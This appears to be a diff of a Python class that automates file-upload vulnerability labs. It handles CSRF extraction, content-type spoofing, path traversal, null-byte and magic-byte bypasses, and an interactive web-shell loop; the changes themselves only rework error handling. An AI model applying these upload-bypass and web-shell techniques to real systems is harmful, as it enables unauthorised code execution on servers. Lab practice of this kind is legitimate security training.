@@ -104,7 +104,7 @@ class FileUpload:
             return False
         
         is_solved = self.session.post(url=f"{self.url}/submitSolution", data={"answer":solve_lab})
-        
+        error_occured = False
         print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
         while True:
             try:
@@ -119,10 +119,14 @@ class FileUpload:
                 print(file_upload_web_shell)
             except EOFError:
                 print("\nExiting shell...")
-                break
+                error_occured = True
+                
             except Exception as e:
                 print(f"Error: {e}")
-                return False
+                error_occured = True
+            finally:
+                if not is_success(self) or error_occured:
+                    return False
         return True
     
     def solve_tutorial(self, exploit_condition, type_of_exploit, burpsuite=False):
@@ -148,8 +152,6 @@ class FileUpload:
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf)
         exploit_condition = self.exploit(file_upload_post)
-        if not is_success(self):
-            return False
         return exploit_condition
         
 
@@ -158,8 +160,6 @@ class FileUpload:
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, "image/png")
         exploit_condition = self.exploit(file_upload_post)
-        if not is_success(self):
-            return False
         return exploit_condition
 
     def path_traversal(self):
@@ -167,8 +167,6 @@ class FileUpload:
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, path_traversal=True)
         exploit_condition = self.exploit(file_upload_post, path_traversal=True)
-        if not is_success(self):
-            return False
         return exploit_condition
 
     
@@ -218,8 +216,6 @@ class FileUpload:
                 break
             except Exception as e:
                 print(f"Error: {e}")
-        if not is_success(self):
-            return False
         return True
     
     def null_byte_injection(self):
@@ -227,9 +223,6 @@ class FileUpload:
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, obsfucated_extension=True)
         exploit_condition = self.exploit(file_upload_post)
-        if not is_success(self):
-            print('hi')
-            return False
         return exploit_condition
     
     def magic_byte_file_upload(self):
@@ -237,8 +230,6 @@ class FileUpload:
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, magic_byte=True)
         exploit_condition = self.exploit(file_upload_post)
-        if not is_success(self):
-            return False
         return exploit_condition
         
         
